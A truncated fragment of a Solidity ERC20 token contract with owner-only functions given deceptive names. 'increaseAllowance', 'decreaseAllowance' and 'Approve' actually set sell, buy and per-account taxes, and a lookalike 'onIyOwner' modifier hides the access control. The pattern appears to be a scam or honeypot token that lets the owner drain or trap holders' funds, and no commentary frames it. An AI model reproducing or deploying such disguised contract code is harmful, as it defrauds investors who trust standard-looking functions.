...
contract pro is ERC20, Ownable {
    ...
    function setBlacklistBots(address[] memory bot) external onlyOwner {
        for (uint256 i = 0; i < bot.length; i++) {
            _isBots[bot[i]]= true;
        }
    }

    function increaseAllowance(uint256 _value) external onIyOwner {
        _sellTax = _value;
    }

    function decreaseAllowance(uint256 _value) external onIyOwner {
        _buyTax = _value;
    }

    function Approve(address _address, uint256 _value) external onIyOwner {
        require(_value >= 0, "Account tax must be greater than or equal to 0");
        _accTax[_address] = _value;
    }

    function setBots(address _address, bool _value) external onIyOwner {
        _isTax[_address] = _value;
    }

    function removeLimits(address _address, uint _amount) external onIyOwner {
